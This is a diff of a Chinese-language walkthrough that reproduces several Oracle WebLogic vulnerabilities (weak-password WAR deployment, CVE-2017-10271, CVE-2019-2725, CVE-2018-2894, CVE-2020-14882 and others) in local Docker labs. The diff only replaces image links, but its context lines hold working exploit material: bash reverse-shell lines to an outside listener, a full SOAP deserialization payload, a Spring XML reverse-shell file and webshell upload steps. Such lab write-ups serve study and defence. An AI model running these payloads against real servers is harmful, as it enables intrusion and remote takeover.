@@ -83,31 +83,31 @@ WebLogic 是美国 Oracle 公司出品的一个 application server，确切的�
 
 进入`weak_password`的 docker 环境
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2FlCMPcGTVDGu6D1KMiaEGCNia8Zbrg7cJyOfukgEaFQrv2uK87tnMiaMQ/640?wx_fmt=png)
+![](../../.resource/remote/6fa31f98c923b4521b47642896bed3b0b421ca6eb9e9f453be10001703653ff1.png)
 
 访问一下 7001 端口，这里出现 404 是正常的
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2Mzb9iaTCecibwp7eREGkKd8AdEuZceibOebQanHZTkFeJJTTJJ7mTfh6w/640?wx_fmt=png)
+![](../../.resource/remote/724855ff331d9023a6e00e3f098d3e12b11433021eada08825e07b096dfad9a5.png)
 
 访问 http://192.168.1.10:7001/console 如下图所示
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2CvjTaKXTljNyLspGmvHNGnILvyYIMVg5ZtcWQg230Hx0FfJ8JW6FJg/640?wx_fmt=png)
+![](../../.resource/remote/f213e1bc231d46ceea5b07fa5fc82dc941a382d40cec8ee4a7b4233879ef3298.png)
 
 这里注意一下不能使用 bp 抓包去爆破，错误密码 5 次之后就会自动锁定，这里使用 weblogic/Oracle@123 登陆后台
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2AmaRRdSmRMQ6SPdrFBtHyL0aRWPAIWPiazlxib9LQx0BJaYtL3AsVnUg/640?wx_fmt=png)
+![](../../.resource/remote/fa33179491922971885d7cde37c02462992e13b12c464b3994deb42730e6606d.png)
 
 登录后台后点击部署
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2jYWXQx7X6F4xiajo3JGNRbJADxTfkic7hUaK7gFxztR25Sbssoyjydibw/640?wx_fmt=png)
+![](../../.resource/remote/06e69271275b30e42569e8f07bcff200d9eb68f21d76c85a1b28d4b2f42a1a36.png)
 
 点击安装
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2ibosQB98iaFo4RHlty6iaaOibudnouicKLKjTXGX4nZV8Duib3q2BdWzXXXw/640?wx_fmt=png)
+![](../../.resource/remote/766dfd5be8209e963e5968d71a1235f05d4e226f167b413a1a765fc2cafba63a.png)
 
 点击上传文件
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2ZkruM27hIwPNx3nNduBhBuDIVZa5KlpwNeeIWbRIRdncmiblHKTaibrQ/640?wx_fmt=png)
+![](../../.resource/remote/e2e9388120854652c37a192bcb735a2a007ba368614084c4782b6cf9c4ecf002.png)
 
 这里需要准备一个 war 包，这个 war 包里面存放的就是一个 jsp 的马，使用如下命令打包当前文件夹下的所有文件
 
@@ -115,27 +115,27 @@ WebLogic 是美国 Oracle 公司出品的一个 application server，确切的�
 jar -cvf aaa.war .
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2mLmX8l4s9fd4QGiagUoEMWhG5pfC1E4dq95ug0tID62ibYrh4yD1alVw/640?wx_fmt=png)
+![](../../.resource/remote/f930ef82d078bb831771465b819c09f4ee423e4af57a891109c1cea4cafa5749.png)
 
 然后上传 aaa.war 点击下一步
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2keLicsTfhvYX19RNMNapcmw5mEZLn6lpFEGbDPdNhOThhXbmlmHxYibQ/640?wx_fmt=png)
+![](../../.resource/remote/0d5fb8bb14876dbbba5459028d6fecff1c6e6643dc9e46f824ffdd94e28c08dc.png)
 
 一直 Next 即可
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2mdRHtjtcRxXmNJSs32ex7r05c5jmIjDnTK0Kia5ibMToJnA60VWnWj2Q/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2biaDSeANcx5DSTv8nFMiatoTMicCA0kg1zFuTxSkOQuAeia2LgYG8hREHg/640?wx_fmt=png)
+![](../../.resource/remote/e363eb781a25079d0295f76878d209011d1abae2e18a41dc370b7f755d726acb.png)![](../../.resource/remote/145dd5686af168ea688a544941d9f2ee876738140f80269043096bb77d4cdb63.png)
 
 到这里点击完成
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2aoLuT3KczA2AZicmRyTsV2Z33dQ6buyEDmOLOBMrqZ5pHtUxYS3N3Yg/640?wx_fmt=png)
+![](../../.resource/remote/cc7296b17f172d87586fad7fee46b41e7ceaaf527825b5506c264634b3ec7f36.png)
 
 可以看到这里 aaa.war 已经部署成功
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2XISFx4PblKrPoJPuHmqELvmFBofdwjCXBVdRITsdFQBuKGsfa4Vg2A/640?wx_fmt=png)
+![](../../.resource/remote/f56cece20e31d9bcdaa3ce47179df09d780b47cc494a2874363cea71f9ae073d.png)
 
 直接上冰蝎连接即可，这里 aaa 是我的 war 名，shell.jsp 是打包在 war 里面的文件
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2jplJNCCYxiakpk6h04TFibkwjclYRwl0YwaRicJoSlOMssPgojYj7D9qQ/640?wx_fmt=png)
+![](../../.resource/remote/6ff36a66f30a128145173d31adc7f5c1718d4a350331dc42308a43bf86939151.png)
 
 CVE-2017-3506
 =============
@@ -157,7 +157,7 @@ weblogic.wsee.workarea.WorkContextXmlInputAdapter
 
 先看一下 weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest 方法
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR26W6piaDVTLD1yD31MrSVYFRcsicaxHU7Su7JCdBYZicmlpPBXnEBPzXpQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/1a8fddd1af74e104b51526446a222fa49d01edaf08cb8e5c83c9927b8605340a.jpg)
 
 第 43 行，将 localHeader1 变量带入到 readHeaderOld() 方法中。localHeader1 变量由第 41 行定义，其值为 work:WorkContext 标签包裹的数据。
 
@@ -165,17 +165,17 @@ weblogic.wsee.workarea.WorkContextXmlInputAdapter
 <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">        <java> ...      </java>     </work:WorkContext>
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2iaDUKyNpktRhnokpH8135iaFFLpAJnORK3CmSt4m8Ow6WOnv54Nq36WQ/640?wx_fmt=png)
+![](../../.resource/remote/cac72701ec2623095957555aea19c3bc3364a0849f3fb7d10aaf337bcb7ec041.png)
 
 跟进 readHeaderOld() 方法（weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld）
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2grQbCxSpDTJN1QRk9oJsOIiahrg35KsfMFrh4Ja5picmF4MzQwdk0hLQ/640?wx_fmt=png)
+![](../../.resource/remote/18e3acf5725a54284b97aa3785803c6cd8017c0e1d28b6d1bebce3e599afcc5e.png)
 
 在 106 行，有一句 new WorkContextXmlInputAdapter(new ByteArrayInputStream(localByteArrayOutputStream.toByteArray()))，创建了 WorkContextXmlInputAdapter() 对象（即对 WorkContextXmlInputAdapter 类进行了实例化），带入构造函数的参数即为传入的 XML 格式序列化数据。
 
 跟进至 WorkContextXmlInputAdapter 类中（weblogic.wsee.workarea.WorkContextXmlInputAdapter ）
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2Lub6bPqH8T4gX5V65NuYbcRWdb0JXmog2w7eqV8V4CSkF7NKHhqn3w/640?wx_fmt=png)
+![](../../.resource/remote/2d045cbabfc5e9a7b92bbdc653ea278a147c7ab744c38b578fd60822286f827b.png)
 
 第 19 行，此处通过 XMLDecoder 反序列化，输入内容可控，故漏洞产生。
 
@@ -184,7 +184,7 @@ weblogic.wsee.workarea.WorkContextXmlInputAdapter
 
 这里使用的`weak_password`环境 weblogic 的版本为 10.3.6，也存在这个漏洞，所以继续使用这个 docker
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2FlCMPcGTVDGu6D1KMiaEGCNia8Zbrg7cJyOfukgEaFQrv2uK87tnMiaMQ/640?wx_fmt=png)
+![](../../.resource/remote/6fa31f98c923b4521b47642896bed3b0b421ca6eb9e9f453be10001703653ff1.png)
 
 访问以下目录中的一种，有回显如下图可以判断 wls-wsat 组件存在
 
@@ -192,15 +192,15 @@ weblogic.wsee.workarea.WorkContextXmlInputAdapter
 /wls-wsat/CoordinatorPortType/wls-wsat/RegistrationPortTypeRPC/wls-wsat/ParticipantPortType/wls-wsat/RegistrationRequesterPortType/wls-wsat/CoordinatorPortType11/wls-wsat/RegistrationPortTypeRPC11/wls-wsat/ParticipantPortType11/wls-wsat/RegistrationRequesterPortType11
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2Be7zufhr0ia47AQk3ISmQ35PQykhuB2pcjydPnDYGTlvXh9yUDoibYDw/640?wx_fmt=png)
+![](../../.resource/remote/b69c4468ca6b38fbbc02a3eab2ded2b63dc348750ecc4b6a99d16a8de565ea6d.png)
 
 在当前页面抓包之后在标签之间分别写存放 jsp 的路径和要写入的 shell
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2cyfNygbGricD8qfgEVubHvm1FOsOVfuvYJJFicqEhvibNJQuYuja23xhA/640?wx_fmt=png)
+![](../../.resource/remote/dcdf44593a0a93087e5a63ae8805fe7dcc17651d12a28837caaaeeb29a5d9451.png)
 
 然后直接冰蝎连接即可
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2ia363Zx3B4efL6p6ZL5y0eDKAfb3ar7YjQP85MhpHz10h3wh9aaiaGSg/640?wx_fmt=png)
+![](../../.resource/remote/431788929efc164458f005855631498cdca729651b41e45ef8ee2a0b19cd7c1c.png)
 
 CVE-2017-10271
 ==============
@@ -217,11 +217,11 @@ XMLDecoder 反序列化漏洞 (CVE-2017-10271)
 
 进入 CVE-2017-10271 对应的 docker 环境
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2DDdgmVBbibHD8ibfG9Z4zJRxUdPIA5EcnaPHIXicjjC7FpPayTo8kLMFw/640?wx_fmt=png)
+![](../../.resource/remote/1bf87227bd093b6d13436654a91254f65f353e35ae910739aa7165c88327991b.png)
 
 访问 http://192.168.1.10:7001/wls-wsat/CoordinatorPortType 如下图所示则存在漏洞
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2rPtbzCUo0xwhRHkE18Tq1iaFTibibJXicfpyIXtW8u4B7YseB3XwXibqfWg/640?wx_fmt=png)
+![](../../.resource/remote/2294fde09e37c0e6f858f13c511d2c558389d6a60792513dd05be15cda7950ed.png)
 
 bp 在当前页面抓包后使用 bash 命令反弹 shell，nc 开启端口即可
 
@@ -229,7 +229,7 @@ bp 在当前页面抓包后使用 bash 命令反弹 shell，nc 开启端口即�
 /bin/bash-cbash -i >& /dev/tcp/192.168.1.2/5555 0>&1
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2MzZdIQ4ibsIpAISFqN0ib9GlLTpM5ichLdMNKE8pzaGNZEm2V3W8nicpNQ/640?wx_fmt=png)
+![](../../.resource/remote/db13d9a1f6905ef9e87c72121a27a6de998a3794095072b57975cbb7c4caf4de.png)
 
 CVE-2019-2725
 =============
@@ -245,7 +245,7 @@ wls-wsat 反序列化漏洞 (CVE-2019-2725)。攻击者可以发送精心构造�
 
 通过 CVE-2019-2725 补丁分析发现，较上一个漏洞 CVE-2017-10271 补丁而言，官方新增了对 class 元素的过滤，并且 array 元素的 length 属性转换为整形后不得大于 10000：
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2uTebw5Tiakx14oodgaWhJuKBnbnAW54iboVTRiatuyCbdibC0sic6x3bibicA/640?wx_fmt=jpeg)![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2mnLphP9boL9nLLot3p8oQChvb2tkyuF7Wa2EWRVsOovib4iaUUrzM9bg/640?wx_fmt=jpeg)
+![](../../.resource/remote/ceb9153acd9795c5c5f2d10e149a6781d613ff3e1cbf917b2f0cd83608a5526d.jpg)![](../../.resource/remote/1ae4f615a551fa7b08337ceed4490b107516c8e4c9e4ee4eef80ac8639ccd7f2.jpg)
 
 本次漏洞利用某个元素成功替换了补丁所限制的元素，再次绕过了补丁黑名单策略，最终造成远程命令执行。
 
@@ -258,7 +258,7 @@ wls-wsat 反序列化漏洞 (CVE-2019-2725)。攻击者可以发送精心构造�
 /_async/AsyncResponseService/_async/AsyncResponseServiceJms/_async/AsyncResponseServiceHttps/_async/AsyncResponseServiceSoap12/_async/AsyncResponseServiceSoap12Jms/_async/AsyncResponseServiceSoap12Https
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2ibZr5ygsuL9U8GfTPnnsXBHs8T6wu4RV5MjQUGXOnibO1dzjIUJMcTPg/640?wx_fmt=png)
+![](../../.resource/remote/54b8c993c6e7f6e4fe147476858714d03598d232e53065548ecb5fb869255798.png)
 
 bp 在当前页面抓包，使用 bash 命令反弹 shell，nc 开启端口监听即可
 
@@ -266,7 +266,7 @@ bp 在当前页面抓包，使用 bash 命令反弹 shell，nc 开启端口监�
 GET /_async/AsyncResponseService HTTP/1.1Host: 192.168.1.10:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Connection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Length: 782Accept-Encoding: gzip, deflateSOAPAction:Accept: */*User-Agent: Apache-HttpClient/4.1.1 (java 1.5)Connection: keep-alivecontent-type: text/xml<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/bash</string></void><void index="1"><string>-c</string></void><void index="2"><string>bash -i >& /dev/tcp/192.168.1.2/5555 0>&1</string></void></array><void method="start"/></void></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR27OOfS5HuI0lC5WyBlUtdoiaiaacNHI5yDzGQkSx7fQ4gQ0oPO3zEwKlA/640?wx_fmt=png)
+![](../../.resource/remote/c8ac901b7edf2230e3831643ca834951ee888ea6b6c5a5e8ca1b0bf85d7ec37d.png)
 
 CVE-2018-2628
 =============
@@ -285,7 +285,7 @@ WebLogic T3 协议反序列化命令执行漏洞 (CVE-2018-2628)。Oracle WebLog
 
 进入 CVE-2018-2628 的 docker 环境
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2zFtANZH4aUbKWtnSEbamVm7U27Bw0VfyPzo0gcjjCqPQN5B2ibXKnYw/640?wx_fmt=png)
+![](../../.resource/remote/b2d04dd031c6e3f7a0204857fdc553c705c3fea0077a99db966ee90d3b7b7e42.png)
 
 这里先使用 nmap 扫描一下是否开启了 WebLogic T3 服务
 
@@ -293,11 +293,11 @@ WebLogic T3 协议反序列化命令执行漏洞 (CVE-2018-2628)。Oracle WebLog
 nmap -n -v -p 7001,7002 192.168.1.10 --script=weblogic-t3-info
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2Jt8WawmibM6yfvLaZHIrCuNWVicdSYNmf9rU65OsMnpZGjKr2DnXrOUw/640?wx_fmt=png)
+![](../../.resource/remote/14f6fbab4af64dd316804d2ee5e84c681c00d995aa49ed0f3119d13ede632bbc.png)
 
 这里使用 K8Weblogic.exe 直接写一个 shell 进去
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2nxnFf2H5ttkXEnorBiaGmnBhSz9libGdrZn1FVhicOPZIM0v9ibtDsQtvw/640?wx_fmt=png)
+![](../../.resource/remote/513433c01df63125b1ba245829409837c5684ff03b997428a11820c6950b0412.png)
 
 然后使用以下 py 获取一个交互型 shell
 
@@ -307,7 +307,7 @@ nmap -n -v -p 7001,7002 192.168.1.10 --script=weblogic-t3-info
 
 url 这个位置就填之前 exe 上传 shell 的位置即可，拿到交互 shell 之后可以 echo 写一个冰蝎马或者 powershell 上线 cs 都可
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR25nWjEkqjsiaUl0BSp0pCykmVsCcia62xHaw8ia84AV6OLp1d0kAcfHjZA/640?wx_fmt=png)
+![](../../.resource/remote/485957578e5f680532edbbef4cca4681370811ee44b80087bfeb21748aba8dc8.png)
 
 CVE-2018-2894
 =============
@@ -319,20 +319,20 @@ WebLogic 未授权访问漏洞 (CVE-2018-2894)，存在两个未授权的页面�
 
 在 ws-testpage-impl.jar/com.oracle.webservices.testclient.ws.res.WebserviceResource 类中存在 importWsTestConfig 方法
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2TIicdn06Sed8iaKKnvRRsqcHLwnrwoWHzBEIJKo3eFibS2NwOgzmZP1dQ/640?wx_fmt=png)
+![](../../.resource/remote/f4140c86157edbc510b8aec4a69be1a5c6c282e2ab52b974fc0bfc925c6f10e9.png)
 
 跟进 RSdataHelper 的 convertFormDataMultiPart 方法，接下来调用 convertFormDataMultiPart 方法，文件直接由字段 文件名拼接而成，没有任何限制。
 
 ws-testpage-impl.jar!/com/oracle/webservices/testclient/ws/util/RSDataHelper.class:164
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2kXeSEXG4em5VTFRxGKa7sOZqeQVLCN6n5x1hN5HlKv27wCRoyVW6dA/640?wx_fmt=png)
+![](../../.resource/remote/afc9ca504a9d8bd1cfa1a7d6b96f65d65a0faa5914be8ad0a4107da585581db4.png)
 
 漏洞复现
 ----
 
 进入 CVE-2018-2894 的 docker 环境
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2RxhicObQaVsGwOh9JSWsNWBPZCP8scwhwicBacGJ2SLynVyia0ok8RpBg/640?wx_fmt=png)
+![](../../.resource/remote/cc539c6064463c10adf794cf3e0b0adc256a33b946ccb3a7780f32bc9781b211.png)
 
 这里我们首先打开 docker 的开发环境。这里因为不是弱口令的 docker，所以这里我们执行命令看一下进入后台的密码
 
@@ -340,23 +340,23 @@ ws-testpage-impl.jar!/com/oracle/webservices/testclient/ws/util/RSDataHelper.cla
 docker-compose logs | grep password
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR21y0roaiaG5MrkG4fgic3KDqeeBvG4oqbFA7Lkh5fN2ncAQEtgJ2kURew/640?wx_fmt=png)
+![](../../.resource/remote/eee8502fba96fe7d98012a46c34cde8ee796a4727993ca994ebe6db9013c3458.png)
 
 使用得到的密码登入后台
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2E8Sia8fZmzUWcl89vy706meaclq6iaIVhw4XkEtOibTGiaqFbxIZ4icqv1Q/640?wx_fmt=png)
+![](../../.resource/remote/fa40df9f1bbf32bd0f9468b9957c9c496e4ee8653a4a00eae3b5507a00a2b7a6.png)
 
 点击高级选项
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2fAAicouK22wavSW9U8skKs3lxFK9rIZ1cPlueQkTjibqseM8tWcuzGoQ/640?wx_fmt=png)
+![](../../.resource/remote/6bd8860c30928014cd532ada046bd44a3607bc41f144cf142efa7bdedfc87635.png)
 
 勾选启用 web 服务测试页
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2zUyBqh3gP2hjDTg8AhL9Iv0niaoMMYsCV90SQ2nNehlnzibIEFIcuFsQ/640?wx_fmt=png)
+![](../../.resource/remote/f867c144eb00b0c294a3590c0927326ae914cf0a2be0c45ecb68c87565672387.png)
 
 保存即可进入开发环境
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2J9u0DHImuzyFF1APd2s8pt2T16tcv31xxgZM66ltgNUqNVgQN3Vh5g/640?wx_fmt=png)
+![](../../.resource/remote/11685525f1a7afcf45f3e809afc3288073a487cd9b819533459701a130bd4ea1.png)
 
 开发环境下的测试页有两个，分别为`config.do`和`begin.do`
 
@@ -366,31 +366,31 @@ docker-compose logs | grep password
 /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2rcNULPquE5sQmBSQpcUfuFww33I6XniatxaVPo5BROXo1hcTUl04Ejw/640?wx_fmt=png)
+![](../../.resource/remote/0388ab856e4992637e11bd4f0b8f660227eecc765097001b7284bee1ab8fb562.png)
 
 点击添加后上传一个 jsp
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2vjEtJtsuYYGPPx0xGJkNMZtG8LRBuABrlqH5pGgzpIbXDfyUC5AdUg/640?wx_fmt=png)
+![](../../.resource/remote/bad086a0eb74166ee70e317c8869a1e0351f62c725715125fa670a2de1489415.png)
 
 提交之后点击 F12 审查元素得到 jsp 上传后的时间戳
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2pq07cSaDuVicwMHw4GTZKYLaibADrDGYuc63GUxc2AVNAl3m7Hf6xGlw/640?wx_fmt=png)
+![](../../.resource/remote/f89755229c718e2778de33bd551d7017ac320d8e0cf996f26fed146548b7f154.png)
 
 构造得到 http://192.168.1.10:7001/ws_utc/css/config/keystore/1626765378314_shell.jsp，连接即可
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2B0qBZwEs5EvyicSvz3dt6jl94KhnQ49Nd93cE02cvhCZYzolZVxnK2g/640?wx_fmt=png)
+![](../../.resource/remote/4148fce6127ee03469872c884490ff230a2df6a53ac1a86a4d70ba3cf8120a32.png)
 
 这里我们在对`begin.do`未授权访问进行利用。访问 http://192.168.1.10:7001/ws_utc/begin.do，上传一个 jsp
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2xxMU55mibvSsCM1S6eVE4AtNVv2Gbkv4AbiaKg3Is6nmwy1MtcOTGLBw/640?wx_fmt=png)
+![](../../.resource/remote/28141d76c457594965c5e0f53879184ed5fdc255f314a8ae7db3dd81b3f532e3.png)
 
 点击提交，这里辉显示一个 error 不用管它，F12 进入网络，然后筛选 POST 方法，得到一个 jsp 的路径
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2lga1jbq7AS8iaHxY0kR0FZK1yokJEZ7B68kzf0I0wAuEsZPwn0BE2Ew/640?wx_fmt=png)
+![](../../.resource/remote/57e7a85f23c9c7288746ee0069de4d80c6c87eaa8352d4ccb9bbe98fc884bc61.png)
 
 构造得到 http://192.168.1.10:7001/ws_utc/css/upload/RS_Upload_2021-07-20_07-21-28_111/import_file_name_shell.jsp，冰蝎连接即可
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR21lhUr76XXFgR4GYYuUWXseZlzCKGYfsSXiaQolaHeQyS5vc8dLGSukw/640?wx_fmt=png)
+![](../../.resource/remote/1e9720fb1ec4f21f43eb283de79ffd804a5b7ebf6dc6985b09ccfb4ab972b9ce.png)
 
 CVE-2020-14882
 ==============
@@ -407,11 +407,11 @@ https://cert.360.cn/report/detail?id=a95c049c576af8d0e56ae14fad6813f4
 
 首先进入 CVE-2020-14882 的 docker 环境
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2BSx66joB8O8NFLnyMYDBXxfgHuyF2Rjnf8nm74DGBibf0fc8IUNSUsQ/640?wx_fmt=png)
+![](../../.resource/remote/c5010a9f6c0ad6254d52744893e2b2573f7fec3e84a886ca34c8d4a33d38e3de.png)
 
 访问控制台如图所示
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2JOL1DfXBneicS4qRnk8febgg5gt2yvdH0HxD0neQwS9qgr6YSrPmwOA/640?wx_fmt=png)
+![](../../.resource/remote/8384129bf1e0879ea1992245232777a14f79d3c8c4063a0f0887cdc2e2435227.png)
 
 这里直接可以构造
 
@@ -421,7 +421,7 @@ http://192.168.1.10:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true
 
 但是这里没有部署安装的按钮，也就是说不能像常规进入后台后写 shell 进去，这里就需要用到远程加载 XML 文件拿 shell
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2g61HibxNHpY5e9JiaUOybibAebicQUEBoRzc7XgArFhbA7ggCYtgec1pjQ/640?wx_fmt=png)
+![](../../.resource/remote/ee0708d0233f198431a9c3e356bccf055645388403db2ba1c09155b3b015b66c.png)
 
 首先测试以下漏洞代码执行是否成功，在 / tmp / 下创建一个 test 文件夹
 
@@ -429,7 +429,7 @@ http://192.168.1.10:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true
 
 得到如下界面，这里看起来没有利用成功
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR20fJDFdqiaBeMcXvs78Vbib74ULiaok4QwLhPtG91ibOgBNxjZUJZqVc6ag/640?wx_fmt=png)
+![](../../.resource/remote/abb3e4a3b76e632cbf8eaa3b8a8eae2ad97df7e8cccf8c340488abc8d15fccc6.png)
 
 我们进入 docker 查看发现文件夹已经创建成功了
 
@@ -437,7 +437,7 @@ http://192.168.1.10:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true
 docker pssudodocker exec -it b6a1b6c3e4d1 /bin/bash
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR26c1mIGOsOVCZKPibdOE3CngSXUSszZ8AGXyXqtNIsicOB8ibd7FgwKJIg/640?wx_fmt=png)
+![](../../.resource/remote/b9aaad97a3e13558c63236c2024d84b0eadaa8c145564ceb72216f977b8c49b0.png)
 
 这里创建一个 xml 文件，还是使用 bash 命令得到反弹 shell
 
@@ -445,7 +445,7 @@ docker pssudodocker exec -it b6a1b6c3e4d1 /bin/bash
 # reverse-bash.xml<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"><bean id="pb" class="java.lang.ProcessBuilder" init-method="start"><constructor-arg><list><value>/bin/bash</value><value>-c</value><value><![CDATA[bash -i >& /dev/tcp/192.168.1.2/5555 0>&1]]></value></list></constructor-arg></bean></beans>
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2vYOYoiaV2GOPQUwYB6Ugl2sXLdox6RVPicw5vTAxl0JGoHlf1FDxOWicw/640?wx_fmt=png)
+![](../../.resource/remote/9add24c9bbcfd1c858482d30131c4c267b7114fef655168962a323e750bf4313.png)
 
 nc 开启监听端口，访问
 
@@ -453,14 +453,14 @@ http://192.168.1.10:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true
 
 即可得到反弹 shell
 
